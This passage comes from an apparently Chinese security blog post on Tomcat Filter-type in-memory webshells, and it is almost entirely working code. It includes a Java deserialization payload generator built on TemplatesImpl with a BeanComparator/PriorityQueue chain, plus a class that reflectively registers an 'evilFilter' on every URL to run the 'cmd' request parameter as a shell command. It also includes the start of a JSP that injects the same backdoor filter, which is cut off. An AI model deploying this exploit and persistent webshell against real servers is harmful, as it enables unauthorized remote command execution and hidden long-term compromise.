class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(FilterTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把请求传回过滤链</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">(String s)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//开始注入内存马</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 这样我们就获取到了 context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTemplatesImpl</span>(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理与反序列化Tomcat-Servlet差不多，只是把恶意模板类改成Filter的实现，创建Servlet的流程改成创建Filter的流程。就不过多解释了。</p><h4 id="jsp注入Tomcat-Filter-型内存马"><a href="#jsp注入Tomcat-Filter-型内存马" class="headerlink" title="jsp注入Tomcat-Filter 型内存马"></a>jsp注入Tomcat-Filter 型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    